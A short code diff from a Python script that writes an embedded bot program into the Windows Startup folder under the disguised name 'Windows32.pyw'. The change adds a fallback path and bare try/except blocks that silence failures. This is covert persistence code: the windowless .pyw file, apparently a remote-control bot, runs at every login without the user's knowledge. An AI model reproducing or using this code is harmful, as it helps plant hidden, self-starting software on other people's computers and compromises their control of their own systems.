@@ -98,6 +98,14 @@ async def delayed_task():
 
 bot.loop_wrapper = lw
 bot.run_forever()""")
-username = username.replace('PC', '')
-with open(fr'C://Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows32.pyw', 'w', encoding='utf-8') as f:
-    f.write(bot_text)
+usernam = username.replace('PC', '')
+try:
+    with open(fr'C://Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows32.pyw', 'w', encoding='utf-8') as f:
+        f.write(bot_text)
+except:
+    pass
+try:
+    with open(fr'C://Users/{usernam}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows32.pyw', 'w', encoding='utf-8') as f:
+        f.write(bot_text)
+except:
+    pass
